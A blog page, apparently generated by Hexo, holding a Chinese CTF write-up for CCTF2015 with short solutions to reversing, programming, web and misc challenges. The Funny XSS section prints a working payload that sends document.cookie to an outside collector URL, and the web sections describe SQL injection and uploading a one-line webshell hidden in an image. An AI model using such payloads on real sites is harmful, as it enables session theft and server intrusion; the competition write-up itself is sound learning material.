@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="z">
+<head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>CCTF2015-writeup[LFP] | lc4t&#39;s blog</title>
+    <meta name="renderer" content="webkit">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta name="description" content="一些随想和笔记">
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="CCTF2015-writeup[LFP] | lc4t&#39;s blog">
+    <meta name="twitter:description" content="一些随想和笔记">
+
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="CCTF2015-writeup[LFP] | lc4t&#39;s blog">
+    <meta property="og:description" content="一些随想和笔记">
+
+    
+    <meta name="author" content="lc4t">
+    
+    
+<link rel="stylesheet" href="/css/vno.css">
+
+    
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css">
+
+
+    
+    <link rel="icon" href="/images/icon.png">
+    
+
+    <meta name="generator" content="hexo"/>
+    
+    <link rel="alternate" type="application/rss+xml" title="lc4t&#39;s blog" href="/atom.xml">
+    
+
+    <link rel="canonical" href="http://example.com/2015/04/27/CCTF2015-writeup[LFP]/"/>
+
+                 
+</head>
+
+<body class="home-template no-js">
+    
+<script src="//cdn.bootcss.com/jquery/2.1.4/jquery.min.js"></script>
+
+    
+<script src="/js/main.js"></script>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="fa fa-list btn-mobile-menu__icon"></i>
+        <i class="fa fa-angle-up btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+<header class="panel-cover panel-cover--collapsed" style="background-image: url(/images/rem-pa.png)">
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        <a href="/" title="前往 lc4t&#39;s blog 的主页"><img src="/images/avatar.jpg" width="80" alt="lc4t&#39;s blog logo" class="panel-cover__logo logo" /></a>
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage for lc4t&#39;s blog">lc4t&#39;s blog</a></h1>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">一些随想和笔记</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+
+        <div class="navigation-wrapper">
+          <div>
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item"><a href="/#blog" title="Visit the blog" class="blog-button">Blog</a></li>
+            
+              <li class="navigation__item"><a href="/friends">Friends</a></li>
+            
+              <li class="navigation__item"><a href="/tags">Tags</a></li>
+            
+              <li class="navigation__item"><a href="/about">About</a></li>
+            
+            </ul>
+          </nav>
+          </div>
+          <div>
+          <nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+  <!-- Weibo-->
+  
+
+  <!-- Github -->
+  
+  <li class="navigation__item">
+    <a href="https://github.com/lc4t" title="GitHub" target="_blank">
+      <i class='social fa fa-github'></i>
+      <span class="label">Github</span>
+    </a>
+  </li>
+
+
+<!-- Stack Overflow -->
+        
+
+  <!-- Google Plus -->
+  
+
+<!-- Facebook -->
+
+  
+<!-- Twitter -->
+
+  
+
+  <li class="navigation__item">
+    <a href="/atom.xml" title="RSS" target="_blank">
+      <i class='social fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li>
+
+
+
+  </ul>
+</nav>
+
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay cover-purple"></div>
+  </div> 
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            <article class="post-container post-container--single">
+
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="2015-04-26T16:45:04.000Z" class="post-list__meta--date date">2015-04-27</time> &#8226; <span class="post-meta__tags tags">于 
+  <a class="-none-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="-none-link" href="/tags/writeup/" rel="tag">writeup</a>
+ </span>
+      <span class="page-pv">
+       Read <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>
+      </span> 
+   
+    </div>
+    <h1 class="post-title">CCTF2015-writeup[LFP]</h1>
+  </header>
+
+  <section class="post">
+    <span id="more"></span>
+
+<h3 id="dynamic-amp-static-100pt"><a href="#dynamic-amp-static-100pt" class="headerlink" title="dynamic&amp;static (100pt)"></a>dynamic&amp;static (100pt)</h3><pre><code>你是喜欢动态还是静态？（Flag非CCTF&#123;&#125;形式）
+
+http://pan.baidu.com/s/1dDk0cP7
+</code></pre>
+<h3 id="圣诞树-200pt"><a href="#圣诞树-200pt" class="headerlink" title="圣诞树 (200pt)"></a>圣诞树 (200pt)</h3><pre><code>http://pan.baidu.com/s/1jGxNcZs (3xq8)
+
+flag非CCTF&#123;&#125;格式
+
+
+这两题基本一个模子刻出来的
+唯一不同就是一个是windows下面用了cygwin 一个是elf格式的
+（然而这并没有什么用）（来跟我一起念ida大法好）
+于是ida找到加密那块 直接看代码就出来了
+简简单单的字符串比较
+</code></pre>
+<h3 id="patient-300pt"><a href="#patient-300pt" class="headerlink" title="patient (300pt)"></a>patient (300pt)</h3><pre><code>请提交正确的解密文件的大写MD5值。Flag格式：CCTF&#123;toupper(md5(file))&#125;
+
+（hint1：这题有两种解法的哦～～！！ 非主流的大概就是我在程序中给你留下的那段话了～～～）
+（hint2：说了两种解法，唔。第一种呢。就是正常的去逆向算法。第二种呢，其实吧，就是那非主流的，其实吧，那句话我只是说给那些用xxxxxxxx的菊苣听的～～～～）
+
+http://pan.baidu.com/s/14jdim
+
+
+这题不放hint简直能做
+看到那十个左右的加密矩阵的我心都是碎的
+而且又不是对称加密 当时就傻逼了
+
+等到第二个hint出来后
+下了个netkeeper 主程序扔到od跑了一下
+大概就是用户名加密解密那块
+然后我就看到了和题目那个算法完全一样的地方
+然后。。把netkeeper的Credit文件翻出来
+这题就出来了
+
+原谅只会非主流做法
+</code></pre>
+<h3 id="PPC-100pt"><a href="#PPC-100pt" class="headerlink" title="PPC(100pt)"></a>PPC(100pt)</h3><pre><code>nc 103.224.82.158 8899
+
+
+
+这题是个原题 所以无耻放链接
+https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BCTF/crypto/weak_enc
+</code></pre>
+<h3 id="RE-500"><a href="#RE-500" class="headerlink" title="RE 500"></a>RE 500</h3><p>先下载编译 <code>aes-finder</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;mmozeiko&#x2F;aes-finder.git &amp;&amp; cd aes-finder</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+
+<p>因为 <code>aes-finder</code> 不能直接处理dump文件，所以我们把他读进内存，（顺便这样不会有大小端的问题，因为现在平台一致）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">&gt;&gt;&gt; target &#x3D; open(&quot;xxxxx&quot;, &#39;rb&#39;).read()</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;aes-finder -PID_of_Python</span><br></pre></td></tr></table></figure>
+
+<p>找到两个密钥，丢进 Python</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; k &#x3D; &quot;592063616e20757365206165732d66696e64657220746f20676f742074686973&quot;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.join(chr(int(k[i:i+2], 16)) for i in range(0, len(k), 2)).replace(&quot; &quot;, &quot;_&quot;)</span><br><span class="line">&#39;Y_can_use_aes-finder_to_got_this&#39;</span><br></pre></td></tr></table></figure>
+
+<p>好了，交 Key。</p>
+<h3 id="PPC-200"><a href="#PPC-200" class="headerlink" title="PPC 200"></a>PPC 200</h3><p>春游途中看到一道 PPC，nc 连了一下发现就是根据显示的 ASCII Art 输入对应字母，脑海中飘过各种不靠谱的方案后决定半自动化打表。</p>
+<p>Code :</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&#x27;data.js&#x27;</span>):</span><br><span class="line">data = json.load(<span class="built_in">open</span>(<span class="string">&#x27;data.js&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;load ascii:&quot;</span> + <span class="string">&quot; &quot;</span>.join(data.values()))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fetching</span>():</span></span><br><span class="line">s = telnetlib.Telnet(<span class="string">&quot;103.224.82.158&quot;</span>, <span class="number">9900</span>)</span><br><span class="line">s.read_until(<span class="string">b&quot;flag.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = s.read_until(<span class="string">b&quot;input:&quot;</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="keyword">if</span> r.startswith(<span class="string">&#x27;Reee&#x27;</span>):</span><br><span class="line">h = re.search(<span class="string">r&quot;[\s\S]*left\):\n([\s\S]*)\ninput&quot;</span>, r).groups()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> h <span class="keyword">in</span> data:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">s.write(data[h].encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m = <span class="built_in">input</span>(<span class="string">&quot;Text:&quot;</span>)</span><br><span class="line">data[h] = m</span><br><span class="line">s.write(m.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">s.write(<span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span>():</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.js&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">json.dump(data, fp)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">Fetching()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">save()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PPC-300"><a href="#PPC-300" class="headerlink" title="PPC 300"></a>PPC 300</h3><p>数据格式很是需要一些脑洞，在队友试出了 1,2,3 这种组合后，我们终于意识到这玩意不是个二维坐标。</p>
+<p>然后 Python 跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line">s = telnetlib.Telnet(host=<span class="string">&quot;103.224.82.158&quot;</span>, port=<span class="number">1234</span>)</span><br><span class="line"><span class="built_in">print</span>(s.read_until(<span class="string">&#x27;that. :)&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>), <span class="number">1</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = s.read_until(<span class="string">&#x27;answer:\n&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>), <span class="number">0.2</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="keyword">if</span> r.strip().startswith(<span class="string">&#x27;Round&#x27;</span>):</span><br><span class="line">table = re.search(<span class="string">r&quot;=======\sHamster\sTable\sStart\s=======\n([\s\S]+)\nInput your answer&quot;</span>, r).groups()[<span class="number">0</span>]</span><br><span class="line">new_table = <span class="string">&quot;&quot;</span></span><br><span class="line">ret = []</span><br><span class="line"><span class="keyword">for</span> n, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(table.split(<span class="string">&quot;\n&quot;</span>)[::<span class="number">2</span>]):</span><br><span class="line">new_table += i[<span class="number">1</span>::<span class="number">4</span>]</span><br><span class="line"><span class="keyword">for</span> n, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(new_table):</span><br><span class="line"><span class="keyword">if</span> i != <span class="string">&quot; &quot;</span>:</span><br><span class="line">ret.append(<span class="built_in">str</span>(n))</span><br><span class="line">ret = <span class="string">&quot;,&quot;</span>.join(ret).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ret.decode())</span><br><span class="line">s.write(ret)</span><br></pre></td></tr></table></figure>
+
+<h3 id="circle-50pt"><a href="#circle-50pt" class="headerlink" title="circle (50pt)"></a>circle (50pt)</h3><pre><code>Rainism最近忙的转圈圈，你能帮他跳出怪圈么？
+hint:(Rainism 喜欢72式&gt; &gt;...)
+
+http://103.224.82.130:2333/
+
+cookie改到72发现页面返回了flag页面,然后是个base64图片,解密即可
+</code></pre>
+<h3 id="phpspy-100pt"><a href="#phpspy-100pt" class="headerlink" title="phpspy (100pt)"></a>phpspy (100pt)</h3><pre><code>大黑阔purpleroc研究了一种不怕被黑阔爆破的shell，0372去purpleroc的blog翻了一份字典怎么都爆破不出来Orz。他只好把题目扔给CCTF的参赛菊苴们来解决了(๑• ̀ᄇ•)́ وﻭ
+hint:这是一个SHELL！！
+
+http://103.224.81.149:23333/328dab5c4d428b2721397b424f3d6b42.php
+
+传phpspy执行
+</code></pre>
+<h3 id="子卓女神-150pt"><a href="#子卓女神-150pt" class="headerlink" title="子卓女神 (150pt)"></a>子卓女神 (150pt)</h3><pre><code>情窦初开的小学弟子卓，认识了他的女神，可是却猜不出女神的想法，你可以帮他么？
+
+http://103.224.82.130:11111/
+
+先点提交看下页面,发现用了strcmp,查之发现一个漏洞,利用得flag
+![](http://ac-HSNl7zbI.clouddn.com/WFGU2yVQ12UUPFE8WnkDDHsFCwUn7OWt3ztoFR9F.jpg)
+</code></pre>
+<h3 id="Funny-XSS-200pt"><a href="#Funny-XSS-200pt" class="headerlink" title="Funny XSS (200pt)"></a>Funny XSS (200pt)</h3><pre><code>破解大黑阔RickGray的Shell后 0372发现大黑阔RickGray自己写了一个XSS防护系统,
+0372看了半天但是却一直没发现有什么猫腻(๑°ㅁ°๑)
+Who Can Bypass mb_ereg_replace?
+&#123;管理员用FireFox&#125;
+(将构造好的payload 发送到Email(gankyou@0xfa.club) Cookies带有flag)
+
+http://103.224.81.149:23333/2c71e977eccffb1cfb7c6cc22e0e7595.php?x=asd
+
+直接payload:
+</code></pre>
+<p><code>103.224.81.149:23333/2c71e977eccffb1cfb7c6cc22e0e7595.php?x=%ce%3cimg%20src=xss.jpg%20onerror=%28window.location.href=%27http://www.[url].com/cookie.php?value=%27%2bdocument.cookie%29;//</code></p>
+<h3 id="招聘-300pt"><a href="#招聘-300pt" class="headerlink" title="招聘 (300pt)"></a>招聘 (300pt)</h3><pre><code>0372经过一系列的吊打 觉得自己吊吊哒 于是就是当地安全鸡公司投了简历。。
+结果被呵呵了。。
+
+hint：开发人员常常在部署环境的时候会忽视一些东西 :(
+：ide
+
+http://103.224.82.130:12345/jianli.php
+
+xxe:发现有个/.idea/workspace.xml （跪WVS）发现目标php页面xxe读之 然后base64解密
+</code></pre>
+<h3 id="安全鸡-400pt"><a href="#安全鸡-400pt" class="headerlink" title="安全鸡 (400pt)"></a>安全鸡 (400pt)</h3><pre><code>0372由于之前的面试被当地的安全鸡公司吊打了Orz。。
+于是便拿起罪恶的电脑(╯&gt;д&lt;)╯ 但是发现他们防御系统好强∑(っ°Д°;)っ 完全把0372这种tools boy挡住了，
+于是又一次。。@CCTF参赛菊居们 (、*●ω●)、
+
+http://103.224.81.149:43333/7e2363db433a20fc31d9c2fa9a19fc09
+
+WEB400放出hint 请在QQ群内找群主私聊
+
+上来先sqlmap,发现卡在表结构不能出字段,手注之;然后是找后台,表名+login.html,php的不行;然后发现是个小小小小的后台,显然禁止改动了,看upload在不在;然后是个上传,a.php.gif图片里插一句话就好
+</code></pre>
+<h3 id="MISC-100pt"><a href="#MISC-100pt" class="headerlink" title="MISC (100pt)"></a>MISC (100pt)</h3><pre><code>你能读出它的意思么？
+
+Jrypbzr gb ppgs. Rkz ay mkz zu qtuc yusk yosvrk ixevzumxgvne. Fdhvdu flskhu dsshduhg lq dqflhqw plolwdub. Zbqrea nccrnerq n xvaq bs jbeq tnzr ebgO. Qn gwc svwe bpm apqnb kwlm, nbcm jlivfyg cm mi mcgjfy. Uapv xh rdbedhts du iwt uxghi atiitg du tprw hwdgi htcitcrt. Ibqqz b hppe ujnf.
+
+每句凯撒,爆破之(出来怎么也不对0.0 结果是没加cctf...)
+13.Welcome to cctf.
+20.Let us get to know some simple cryptography.
+23.Caesar cipher appeared in ancient military.
+13. Modern appeared a kind of word game rotB.
+18.If you know the shift code,
+6.this problem is so simple.
+11.Flag is composed of the first letter of each short sentence.
+25.Happy a good time.
+cctf&#123;WLCMItFH&#125;
+</code></pre>
+<h3 id="Misc-400"><a href="#Misc-400" class="headerlink" title="Misc 400"></a>Misc 400</h3><pre><code>bmp 无脑 binwalk，看到后面附加了一个 rar，然后尝试 unrar 发现密码为 单个 bmp 的 MD5。当然这里被小坑了一下……密码为`a20ab1a5e49e4b140eeae460eeb10b7f`。
+
+rar 里面是一个 flag 文件，file 查看显示有文件分区的存在，然后使用 testdisk 从里面恢复出文件(直接解压磁盘文件也可以)
+</code></pre>
+
+  </section>
+
+</article>
+
+<section class="read-more">
+           
+    
+               
+            <div class="read-more-item">
+                <span class="read-more-item-dim">Newer Post</span>
+                <h2 class="post-list__post-title post-title"><a href="/2015/05/10/gnome3禁用触摸板后怎样打开/" title="gnome3禁用触摸板后怎样打开">gnome3禁用触摸板后怎样打开</a></h2>
+                <p class="excerpt">
+                
+                gnome3在 菜单的设置选项中禁用了触摸板后无法启用,经过摸索找到了解决办法:
+                &hellip;
+                </p>
+                <div class="post-list__meta"><time datetime="2015-05-09T16:45:04.000Z" class="post-list__meta--date date">2015-05-10</time> &#8226; <span class="post-list__meta--tags tags">于 
+  <a class="-none-link" href="/tags/ArchLinux/" rel="tag">ArchLinux</a>, <a class="-none-link" href="/tags/Gnome3/" rel="tag">Gnome3</a>, <a class="-none-link" href="/tags/%E8%A7%A6%E6%91%B8%E6%9D%BF/" rel="tag">触摸板</a>
+</span><a class="btn-border-small" href="/2015/05/10/gnome3禁用触摸板后怎样打开/"></a></div>
+                           
+            </div>
+        
+        
+               
+            <div class="read-more-item">
+                <span class="read-more-item-dim">Older Post</span>
+                <h2 class="post-list__post-title post-title"><a href="/2015/02/09/vmware11安装图形化archlinux20150201/" title="vmware11安装图形化archlinux20150201">vmware11安装图形化archlinux20150201</a></h2>
+                <p class="excerpt">
+                
+                
+
+Archwiki指引-&amp;gt;测试vmware的dhcp是否正常
+ping -c 1 t.cn
+
+测试正常
+-&amp;gt;准备存储设备
+首先要确定系统安装的目标设备，下面命令会显示所有连接到系统的设备和分区状况
+lsblk
+
+用parted新建分区表 msdos分区 给 / 10G 剩下的给/hom
+                &hellip;
+                </p>
+                <div class="post-list__meta"><time datetime="2015-02-08T16:45:04.000Z" class="post-list__meta--date date">2015-02-09</time> &#8226; <span class="post-list__meta--tags tags">于 
+  <a class="-none-link" href="/tags/ArchLinux/" rel="tag">ArchLinux</a>, <a class="-none-link" href="/tags/VMware/" rel="tag">VMware</a>, <a class="-none-link" href="/tags/%E5%9B%BE%E5%BD%A2%E5%8C%96/" rel="tag">图形化</a>
+</span><a class="btn-border-small" href="/2015/02/09/vmware11安装图形化archlinux20150201/"></a></div>
+                       
+            </div>
+        
+     
+   
+   
+  
+</section>
+
+  
+
+            <footer class="footer">
+    <span class="footer__copyright">
+        &copy; 2021 lc4t
+       
+    </span>
+    <span class="footer__copyright">
+            
+         </span>
+       
+    
+    
+</footer>
+
+
+        </div>
+    </div>
+
+     
+<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-96200907-1', 'auto');
+	ga('send', 'pageview');
+</script>
+
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?a9801aa00a5615a147c66e9f1f2893c6";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    
+</body>
+</html>
